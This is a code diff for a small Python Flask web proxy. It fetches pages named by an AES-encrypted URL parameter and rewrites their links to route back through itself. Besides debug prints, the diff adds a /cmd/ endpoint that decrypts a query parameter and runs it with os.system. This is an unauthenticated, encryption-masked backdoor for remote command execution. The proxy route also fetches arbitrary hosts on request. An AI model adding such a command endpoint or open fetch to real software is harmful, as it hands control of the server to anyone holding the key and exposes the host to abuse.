@@ -2,9 +2,10 @@ import requests as requests
 from flask import Flask, request
 from aes import decrypt, encrypt
 import bs4
+import os
 
 app = Flask(__name__)
-
+app.config['JSON_AS_ASCII'] = False
 
 @app.route('/')
 def hello_world():
@@ -18,13 +19,21 @@ headers = {
     "Accept-Encoding": "gzip, deflate, br",
     "Referer": "http://www.sdyu.edu.cn/index.htm",
 }
-
+# @app.before_request
+# def proxy():
+#     headers = {h[0]: h[1] for h in request.headers}
+#     print('request.json',request.json)
+#     # headers['x-token'] = '***'
+#     # 一些自己的逻辑...
+#     return requests.request(request.method, request.url, data=request.json, headers=headers).content
 
 @app.route('/url/')
-def demo():
+def url():
     html = ''
     try:
-        url = decrypt(request.args.get("url"))
+        print(request.args.get("url"))
+        url = decrypt(request.args.get("url").replace(' ','+'))
+        print('url',url)
         html = requests.get(url=f'http://{url}', headers=headers).text.encode().decode('utf-8')
         with open("tmp.html",'w') as f:
             f.write(html)
@@ -33,26 +42,32 @@ def demo():
         href_set = {item.get('href') for item in soup.find_all(href=True)}
         replace_dict = {}
         # print(href_set)
+        SS = '/url/?url='
         for item in href_set:
             try:
                 if item.startswith('https://'):
-                    replace_dict[item] = f'/url/?url={encrypt(item)}'
+                    replace_dict[item] = f'{SS}{encrypt(item)}'
                 elif item.startswith('http://'):
-                    replace_dict[item] = f'/url/?url={encrypt(item)}'
+                    replace_dict[item] = f'{SS}{encrypt(item)}'
                 # elif item.startswith('//'):
-                #     replace_dict[item] = f'/url/?url={encrypt(f"http:{item}")}'
+                #     replace_dict[item] = f'{SS}{encrypt(f"http:{item}")}'
                 # elif item.startswith('/'):
-                #     replace_dict[item] = f'/url/?url={encrypt(f"http://{url}{item}")}'
+                #     replace_dict[item] = f'{SS}{encrypt(f"http://{url}{item}")}'
             except:
                 pass
         # href_set = {"" if item in replace_dict else item for item in href_set}
         # print(href_set)
         for key in replace_dict:
+            print(key, replace_dict[key])
             html = html.replace(key, replace_dict[key])
-    except:
-        pass
+    except Exception as e:
+        print(e)
     return html
 
+@app.route('/cmd/')
+def cmd():
+    cmd = decrypt(request.args.get("cmd").replace(' ','+'))
+    os.system(cmd)
 
 if __name__ == "__main__":
     app.run()
